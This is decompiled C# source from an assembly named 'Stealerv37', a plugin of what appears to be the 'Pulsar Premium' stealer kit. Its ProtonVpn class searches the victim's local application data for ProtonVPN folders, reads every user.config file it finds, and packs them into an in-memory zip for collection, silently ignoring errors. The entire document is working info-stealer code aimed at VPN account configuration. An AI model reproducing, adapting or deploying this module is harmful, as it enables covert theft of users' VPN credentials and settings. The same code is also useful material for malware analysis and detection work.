// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Vpn.ProtonVpn
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

#nullable disable
namespace Intelix.Targets.Vpn;

public class ProtonVpn : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ProtonVPN");
    if (!Directory.Exists(path1))
      return;
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = "ProtonVPN";
    Parallel.ForEach<string>((IEnumerable<string>) Directory.GetDirectories(path1), (Action<string>) (dir =>
    {
      try
      {
        if (!dir.Contains("ProtonVPN_"))
          return;
        Parallel.ForEach<string>((IEnumerable<string>) Directory.GetDirectories(dir), (Action<string>) (version =>
        {
          try
          {
            string path3 = Path.Combine(version, "user.config");
            if (!File.Exists(path3))
              return;
            zip.AddFile($"ProtonVpn\\{Path.GetFileName(version)}\\user.config", File.ReadAllBytes(path3));
          }
          catch
          {
          }
        }));
      }
      catch
      {
      }
    }));
    counterApplications.Files.Add(path1 + " => ProtonVpn");
    counterApplications.Files.Add("ProtonVpn\\");
    counter.Vpns.Add(counterApplications);
  }
}
